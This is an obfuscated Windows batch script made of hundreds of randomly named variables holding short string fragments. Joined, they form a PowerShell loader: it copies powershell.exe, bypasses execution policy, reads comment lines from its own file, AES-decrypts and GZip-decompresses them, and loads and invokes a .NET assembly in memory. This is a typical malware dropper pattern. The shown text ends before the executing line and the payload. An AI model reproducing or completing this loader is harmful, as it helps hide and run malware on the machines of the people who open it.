@echo off
set "lwCILclhjp=.e"
set "cfQGzRDtyS=y "
set "pgNtHwgOIp=we"
set "cJawppvaxH= /"
set "odHgpJsdrw=\v"
set "CAWiESpWjk=po"
set "iGfxIvYppH=Sy"
set "OSaMGpoCZS=rS"
set "wKUIjEYvAY=nd"
set "WWdzUREgaI=he"
set "BtQYMOpQtc=Po"
set "yBODjSsXJs=we"
set "mNlnZrOWne= C"
set "RlBfkQKRNm=\W"
set "SaNZJEumbh=0\"
set "FAhmnuSpve=ws"
set "VjzqxHtTsT=s\"
set "QwPmnOmzDv=in"
set "fTYzmYAZGK=:\"
set "iKOxnQAQNk=ow"
set "ledHQBFqOR=32"
set "FkyOLzNOFQ=ll"
set "JzpZiwifbt=py"
set "VFtsVgjhQP=Wi"
set "zNRAfsdozQ=1."
set "rkJAqXHbBt=co"
set "kueMwVbRQb=do"
set "CIzyWszEIk=xe"
set "FtuGUmkDlC=em"
set "wzpPYopHxK=rs"
set "ogbkUYQJWm=he"
set "ZfzHCkQWef=st"
set "dgeorqlkQQ=ll"
set "BkLSTGZdIq= %~dp0"
set "BLjutbsyNS=cd"
set "WeXYczeuzX=S46e"
set "VzlSvwVYcq=tem."
set "NBVAKUKeiF=ct S"
set "gZUVqYcylB=stem"
set "RCgnwuuaez=gth)"
set "lLfIqNenWV= if "
set "hMWYcNRRhd=ispo"
set "EuOdsQAuLk=$ikz"
set "DteqXUnrtV=IdJW"
set "grSeAxrLoq=ment"
set "hBQRqOKGhN=g = "
set "jaPEIhrZRK=W, 0"
set "hfcealJYVW=m(, "
set "NkRmrkKlvS=$GId"
set "IJKFeMvair=Star"
set "HRqSmOQCXI= = ["
set "dNvAdBzIdo=ypto"
set "VXMUCcFjtM=Obje"
set "KadUQhiMHX=JW);"
set "DLVJsUmHZx=.Key"
set "RmBjgvlwAq=V = "
set "jzlcTOLkxC=-joi"
set "ThVaxIkqZz=t Sy"
set "IDYDHQFlFF=] -j"
set "DQJSfOZCEq=::De"
set "bvGdrOIKbL=ct S"
set "cTXmpfjjIC=pose"
set "GvLsYvfdwA=em.C"
set "fixZyeIuPy=kDq "
set "JlxpvaNBUs=GIdJ"
set "vXCShyZzqn=fore"
set "dKPBQmzTWO=Bmor"
set "ibfrNHlHby=Invo"
set "CcXowYrSVB=GVLE"
set "vlcprFXACo=v4Ir"
set "sobrHcLSzs=$ahB"
set "QlzEodDCiB=urit"
set "hLWshEvDBW=join"
set "qCiWsSAybO=ke($"
set "VOflUkAJiQ=[IO."
set "VnDSDyBYhy='[-1"
set "MhQtwJtiRX=rtS4"
set "epvcBLXXGg=IXSG"
set "istTbzkmRT=.Cre"
set "bezfasEWBX=ert]"
set "GTyuHthewU=.Cop"
set "lCNnQGYAis=ss -"
set "uurSUMkWTu=3HWs"
set "owhZeHgjQr=y]::"
set "fXOaUXMqdE=Stre"
set "RXWcnpoPMY=yTo("
set "BlsVTPLorx=Comp"
set "YlnXFRnHVl=VzJ "
set "TzYSZuomMX=IdJW"
set "crubOrYjND=;$VP"
set "vbGidQAqqd=;$RW"
set "iSdqKbVFLz=, (,"
set "NVBOXFYFHu=Mode"
set "fOQFudFmJd=XI ="
set "JpPHkcpEzq=lit("
set "cJspCcVALE=$VPa"
set "kjJEvkWbGB=ress"
set "TmLCDXNmMh=Wcv."
set "AXdUuThrhJ=.Dis"
set "DVzUODOvsT=nage"
set "iKzWagZbuS=.-16"
set "dbOMcoQCTI=);$D"
set "goMRbybVUs=7Yiv"
set "majiuRQsMa=ddin"
set "FlecLRKeiX=ing("
set "LVLeRyizXk=se()"
set "dXrYbEDbCF=-Obj"
set "drilJFAXUG=($yA"
set "OsZSaPGxNx=stem"
set "kpofPDtBkB=hYl "
set "rKmQLXjxPu=GIdJ"
set "aBhrubvzan=Syst"
set "IFREHpfapi=ress"
set "XgbRBZAMdB=);$S"
set "PDssjItfAH=e]::"
set "HypStnHXnm=.Cry"
set "MRtWSKXhoY=n ''"
set "tMgUnRtFWw=tion"
set "dEjiZqXAEF=ress"
set "fyEaCCScfx=brea"
set "krHnXjVkxM=.Sec"
set "AEqlMVkyAN=ect "
set "RTOqHMcvLK=).Sp"
set "UazcULJwoM=)($T"
set "UcpCJFKnFG=join"
set "bTHhCxmVLS=ode]"
set "qpVNyYxeFV=raph"
set "rjvGXmaTMB=yAkD"
set "jVLwxQsVkK=ose("
set "YoEveQqpit=.Len"
set "hPqtBAplDc=bstr"
set "ydXGHAUoQT=oL'["
set "yJdVBBolnm=ptog"
set "OzRaywiywR=ptog"
set "LykwKbTkvE===')"
set "LpfmbFZbAd=Comp"
set "wIwPmIaUfe=rity"
set "vabNmFEhCe=Conv"
set "TmYbKimZMO=stem"
set "UZgDSwXkfC= [Sy"
set "MKlQPEGvqX=-4] "
set "OHeDoShgEw=);$i"
set "CaanSRLCpu=oArr"
set "BpsywhENcz=XI.T"
set "DdPjNGGDpL=Secu"
set "QFloRQWyGO=;$RW"
set "nVpkjQDjjv=GIdJ"
set "PDuJiEHVns=New-"
set "SyTxkDwQvx=ne);"
set "xCiLvusGPv=l.En"
set "ximwBgynhw=('da"
set "hkIaDgbhoT= New"
set "zkxIEUPxKG=oin "
set "jCOuylIIwb=yste"
set "MhtytVSFcF=('%~f0'"
set "aXqmLlgEmA=, $G"
set "azSjFZksFQ=IXSG"
set "oZSAAwfrCb=onve"
set "gbnHfShlRt=ay()"
set "tQkpIrTWvm=esFX"
set "kWtMnflHbn=bjec"
set "JEapcqksdU=[Sys"
set "KrcqwSqejD=CAko"
set "GofLKBYSwT=]::N"
set "GzdKSNrhzC=form"
set "IEIPjJSLsc=zJ.T"
set "tWALTaLpoc=th('"
set "sWMquuPIKr=[-1."
set "idBriAKszO=+hAO"
set "zBynNrCCtu=gMod"
set "DdEdHOfPXL=null"
set "USJuzSWkCK=);$S"
set "yFfvpiZiii=IXSG"
set "nwjPPaJoZT=IXSG"
set "MPDqXgGezj=$GId"
set "gPPHnuGDhW=:: '"
set "twiAFRagRd=tS46"
set "bfLfkYbTlB=CAko"
set "WFpxEuXqrt=.Com"
set "trJqKmTAXx= = $"
set "hxNiIcPYBM=esMa"
set "MflaOajQKb=iron"
set "zGaposegUt=flec"
set "CVcEQJzFmC=Syst"
set "KLQjTDyLDA=d;$S"
set "AaerfpXPIH=m.IO"
set "qdBOmbQsxr=comp"
set "xZzeiPXjJE='dqR"
set "WTKYTvJWxg='gni"
set "nVqCjKOlWZ=Fo7l"
set "QKBQVzveum=SG.I"
set "RCNfbBsfIn=saBm"
set "kgqrSbEDpr=rt]:"
set "NWTqPSINfh=$RWV"
set "uJAuVZIGed=; };"
set "OsYvptDvnf=..-1"
set "akaQunGpyo=kDq."
set "OQByVMiMAC=tsWi"
set "TUjrhpmKEG=IXSG"
set "qgyLtxaUXR=orF'"
set "ISlhkSEGDI=.IO."
set "jAIOQarBfF=gi ="
set "uTNHXxJUWb='txe"
set "sBhdsIrztU=1..-"
set "RYwfvKBoxU=esaB"
set "ecokCavdoe=();$"
set "KrFloTHfMF=)))"
set "ektjYfGiCa=SIXS"
set "dffLzQYDjF=y.Pa"
set "SxVLmaKVdi=yste"
set "SZuqhGUeJg=sGUc"
set "tBPUqxReTC=TllA"
set "aiUydxdqVR=6] -"
set "ashNhSTbin=.Ass"
set "vLuqTjBzTP=GzhY"
set "JaCTwODwGZ=kzXI"
set "HTUSDdalPh=tem."
set "UrbeccroCj=16] "
set "vlaBqTjuof=-nop"
set "hLgZREfUag=$DGV"
set "erYjhTTvsT=i) {"
set "AnnTetdpEn=ose("
set "XFkzzBbCTn=rans"
set "uzpkfMJPtM=.Con"
set "ZsWJjsDbtx=yste"
set "eUufUwAHul=OyzA"
set "koyOOilvix=$ikz"
set "gGsrmYSXlD=eam("
set "tnvuJVSGAp=and "
set "bquQYUfVhV=ach "
set "DfDcoGMLRr=.Dis"
set "onvCTlZUwq=Secu"
set "hbMPvBHSYi=7;$S"
set "aiWAFLvsge=y.Ci"
set "INgwtbIHRY=nirt"
set "zNkfiDliJA=-1.."
set "PcrFGiVrJa=DGVL"
set "YihJpxNAHn=3); "
set "CLaeCqDGEt=daeR"
set "AnujVBwrsI=gnir"
set "dAZUJMfrLz== $S"
set "dLBrOcFFAF=F'[-"
set "lIxNiXsBkm=Obje"
set "qjxYTuxzym=;$Gz"
set "NmnGbvGEpf=e = "
set "VqEHJORhQc=)($G"
set "tmedjQNiSB=m.Re"
set "LiFRZIQkvT=ecry"
set "gkSQjNIZxB=vert"
set "UiGQJMKgUk=$ikz"
set "RfTRAjBYXw=ck($"
set "NoNXvOQbfS=Disp"
set "tjKDHoDgus=ion."
set "VKzNqraJNK=::('"
set "UQvSJbmQUD=Disp"
set "eLPeOUqoYf=);$E"
set "RMkUvONMBh=oryS"
set "RTbuPEnrQd=.GZi"
set "bQrAJWeQxS=oint"
set "FVtSEOKpkz=morF"
set "jvYXpMJYaS=]::("
set "jKKOJOoGfS=VPaU"
set "ZeQgSqMDpP=]::C"
set "JaQXYxlAhQ=W = "
set "fFEDsThXTJ= = $"
set "fUOWVMiYMd=  $T"
set "KDSahixRDP=em.I"
set "qCqOhZhIxb=UGTu"
set "FzgqZiaRhU=-ep "
set "fkskbXiXiC=E = "
set "YHZLaiSxNo=JW ="
set "NmpjBVcLzr=ateD"
set "EBWwareOjL= [st"
set "sCTexiuHBg=($yA"
set "KPYUtPcqEr=W = "
set "cbXzgQiYVq=;$EQ"
set "BwKpqyySmr=[]] "
set "UspEDRAPOb=]::("
set "tVRoaBDMjh=n ''"
set "UZFWLLtUhV=VzJ."
set "rUSKTBRoOk=..-1"
set "nJJlKBOJjG=E = "
set "EGNWPqnzdQ=.Mem"
set "rORBoKDTXB='[-1"
set "kzODSjJBUH=)) {"
set "WGNfRhFrxh=ZYYc"
set "lfKvmZEzXA=pher"
set "SegeVjDteI=XI);"
set "xpkYDexcKZ=ring"
set "iCgYDKdJZd= '')"
set "gwOXPQewZe==');"
set "IIuzbbhOaZ=rity"
set "clmXXEePSj=ewLi"
set "dHPvAtLKzu=comm"
set "SiaOLBQtAn=New-"
set "XvBZyNtfPf=('l0"
set "VpUVUNJRjO=[Env"
set "DHIbOlbxwo=y.Cr"
set "VWUBisirwq=pres"
set "lzDGkNYIBV=ew-O"
set "fCOTJzauVt=.Mod"
set "TxXiEMbztB=tryP"
set "UqbOcKhfSj=ptor"
set "nxyboSveTn=trea"
set "orrcfDfCjM=pStr"
set "SRbyCufCps=rofi"
set "OTNFAuPhXd=aUE."
set "EqBUZymUxJ=File"
set "qUbgUYhsDV= [Sy"
set "NaSnJVAqGm=grap"
set "ysVLnYmXan=am;$"
set "XPpJVbDOte=k; }"
set "MTRRetsGuQ=embl"
set "rawNKerbNp=Fina"
set "ciSbPIJrKM=raph"
set "BSASLRalBG=();$"
set "EevaTJLiNy=[Sys"
set "zNHMRmfYTR=:('g"
set "DbGjBWRwrQ=ddin"
set "HpLIwLcLWs=736u"
set "RgqJAnAavC=$SIX"
set "cOmAsXPCFT=le  "
set "AnBlFYAsUt=6esa"
set "LJvqfGHCKn='')("
set "UfyYskyAsE=-joi"
set "gVeibWyxPQ=BC;$"
set "XVfRGxMEcd=m.IO"
set "IdqUachbsQ=pose"
set "sQkEWVILXj=pDZz"
set "zDJeDCTxoH=O.Me"
set "reQMNiWXAt=tem."
set "fRBscdFJmH=UE, "
set "PEdeSXnQrg=isfL"
set "WCHAqhVNis=mory"
set "HzhrcDAQoE=QWcv"
set "xFoQnpJLlB=PKCS"
set "FzheSiMtQn=lBlo"
set "MPLMfgpEDW=G.Pa"
set "BxfFoYDLFH=[Sys"
set "JBfWrruJGz=LE.D"
set "NRHxcIvAST=.Cry"
set "XVMCjchidp=('%*'"
set "foWLRcSASh= = N"
set "awWmzITJfH=1] -"
set "NDgKXJIJXZ=0O+g"
set "IgWFZcFBBn=bypa"
set "uXMslbroYb=sion"
set "vzpKXCIFzM=hy.A"
